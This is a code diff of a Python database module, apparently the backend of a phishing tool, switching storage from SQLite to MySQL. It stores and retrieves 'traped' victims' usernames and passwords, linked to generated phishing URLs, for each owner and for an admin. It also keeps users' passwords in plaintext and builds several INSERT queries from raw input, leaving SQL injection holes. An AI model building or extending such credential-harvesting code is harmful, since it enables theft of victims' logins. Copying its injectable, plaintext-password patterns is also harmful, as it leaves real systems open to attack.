@@ -1,59 +1,62 @@
-import sqlite3
-conn=None
+import mysql.connector
+import os
+# Get database credentials from environment variables
+# Connect to the database
+conn = mysql.connector.connect(
+    host = os.environ.get('DB_HOST'),
+    user = os.environ.get('DB_USER'), 
+    password = os.environ.get('DB_PASSWORD'), 
+    database = os.environ.get('DB_DATABASE')
+)
 
-def ConnectionToTrapedDB():
-    global conn
-    conn=sqlite3.connect('TrappedData.db',check_same_thread=False)
-    conn.execute('''CREATE TABLE IF NOT EXISTS TRAPED
+# Create a cursor object
+cursor = conn.cursor()
+
+cursor.execute('''CREATE TABLE IF NOT EXISTS USERS
+            (UID  VARCHAR(255) PRIMARY KEY NOT NULL,
+            EMAIL TEXT NOT NULL,
+            PASSWORD    TEXT    NOT NULL);
+            ''')
+
+cursor.execute('''CREATE TABLE IF NOT EXISTS TRAPED
             (OWNER TEXT     NOT NULL,
             APP    TEXT NOT NULL,
             UID  TEXT NOT NULL,
             PASSWORD    TEXT    NOT NULL);
             ''')
-    
-    conn.commit()
-    print("Made  Connection to Traped Database")
-    return conn
-
-def ConnectionToUserDB():
-    global conn
-    conn=sqlite3.connect('UserData.db',check_same_thread=False)
-    conn.execute('''CREATE TABLE IF NOT EXISTS USERS
-            (UID  TEXT PRIMARY KEY NOT NULL,
-            EMAIL TEXT NOT NULL,
-            PASSWORD    TEXT    NOT NULL);
-            ''')
-    conn.commit()
-    print("Made Connection to Users Database")
-    return conn
-
 
 
 # used while registering and checking for generated phishing url
 def checkIfUserExists(uid):
-    conn=ConnectionToUserDB()
-    if len(conn.execute("select UID from USERS where UID=?", (uid,)).fetchall())==0:
-        conn.close()
+    global cursor
+    try:
+        cursor.execute("SELECT UID FROM USERS WHERE UID=%s", (uid,))
+        result = cursor.fetchall()
+        if len(result) == 0:
+            return False
+        return True
+    except mysql.connector.Error as err:
+        print("An error occurred:", err)
         return False
-    conn.close()
-    return True
+
 
 
 
 #used while registering
 def insertIntoUser(uid,email,pas):
-    conn=ConnectionToUserDB()
-    conn.execute(f"INSERT INTO USERS (UID,EMAIL,PASSWORD) \
+    cursor.execute(f"INSERT INTO USERS (UID,EMAIL,PASSWORD) \
       VALUES ('{uid}','{email}','{pas}' )")
     conn.commit()
     print("user added")
-    conn.close()
 
 
 
 #used while logginig
 def checkUserCredential(uid,pas):
-    for row in ConnectionToUserDB().execute(f"SELECT UID,PASSWORD from USERS where UID=?",(uid,)):
+    global cursor
+    cursor.execute("SELECT UID,PASSWORD from USERS where UID=%s",(uid,))
+    user_cred = cursor.fetchall()
+    for row in user_cred:
         if row[0]==uid and row[1]==pas:
             return True
         return False
@@ -63,20 +66,21 @@ def checkUserCredential(uid,pas):
 
 #used to insert into traped data
 def insertIntoTraped(owner,site,uid,pas):
-    conn=ConnectionToTrapedDB()
-    conn.execute(f"INSERT INTO TRAPED (OWNER,APP,UID,PASSWORD) \
+    cursor.execute(f"INSERT INTO TRAPED (OWNER,APP,UID,PASSWORD) \
       VALUES ('{owner}','{site}','{uid}','{pas}' )")
     conn.commit()
     print("user traped")
-    conn.close()
 
 
 
 #get the traped data for user
 def getTrapedDataForOwner(uid):
-    cursor = ConnectionToTrapedDB().execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED where OWNER=?",(uid,))
-    n=ConnectionToTrapedDB().execute("select count(*) from TRAPED where OWNER=?",(uid,)).fetchall()[-1][-1]
-    return [cursor,n]
+    global cursor
+    cursor.execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED where OWNER=%s",(uid,))
+    detail= cursor.fetchall()
+    cursor.execute("select count(*) from TRAPED where OWNER=%s",(uid,))
+    n=cursor.fetchall()[-1][-1]
+    return [detail,n]
 
 
 
@@ -85,55 +89,49 @@ def getTrapedDataForOwner(uid):
 
 #for admin
 def getTrapedData():
-    cursor = ConnectionToTrapedDB().execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED")
-    n=ConnectionToTrapedDB().execute("select count(*) from TRAPED").fetchall()[-1][-1]
-    return [cursor,n]
+    global cursor
+    cursor.execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED")
+    detail= cursor.fetchall()
+    cursor.execute("select count(*) from TRAPED")
+    n=cursor.fetchall()[-1][-1]
+    return [detail,n]
 
 
  #for admin      
 def getUserData():
-    cursor = ConnectionToUserDB().execute("SELECT UID,EMAIL,PASSWORD from USERS")
-    n=ConnectionToUserDB().execute("select count(*) from USERS").fetchall()[-1][-1]
-    return [cursor,n]
+    global cursor
+    cursor.execute("SELECT UID,EMAIL,PASSWORD from USERS")
+    detail= cursor.fetchall()
+    cursor.execute("select count(*) from USERS")
+    n=cursor.fetchall()[-1][-1]
+    return [detail,n]
     
 
 #for admin
 def saveFeedback(uid,name,email,msg):
-    conn=sqlite3.connect('Message.db',check_same_thread=False)
-    conn.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
+    global cursor
+    cursor.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
             (UID  TEXT  NOT NULL,
             NAME TEXT NOT NULL,
             EMAIL TEXT NOT NULL,
             MSG    TEXT    NOT NULL);
             ''')
-    conn.execute(f"INSERT INTO MESSAGE (UID,NAME,EMAIL,MSG) \
+    cursor.execute(f"INSERT INTO MESSAGE (UID,NAME,EMAIL,MSG) \
       VALUES ('{uid}','{name}','{email}','{msg}' )")
     conn.commit()
-    conn.close()
 
 
 #for admin
 def getFeedbackData():
-    conn=sqlite3.connect('Message.db',check_same_thread=False)
-    conn.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
+    global cursor
+    cursor.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
             (UID  TEXT  NOT NULL,
             NAME TEXT NOT NULL,
             EMAIL TEXT NOT NULL,
             MSG    TEXT    NOT NULL);
             ''')
-    cursor = conn.execute("SELECT UID,NAME,EMAIL,MSG from MESSAGE")
-    n=conn.execute("select count(*) from MESSAGE").fetchall()[-1][-1]
-    return [cursor,n]
-
-
-
-
-
-
-#for admin
-def deleteAll():
-    ConnectionToTrapedDB().execute("drop table TRAPED")
-    conn.close()
-    ConnectionToUserDB().execute("drop table USERS")
-    conn.close()
-    print("data deleted")
+    cursor.execute("SELECT UID,NAME,EMAIL,MSG from MESSAGE")
+    detail = cursor.fetchall()
+    cursor.execute("select count(*) from MESSAGE")
+    n=cursor.fetchall()[-1][-1]
+    return [detail,n]
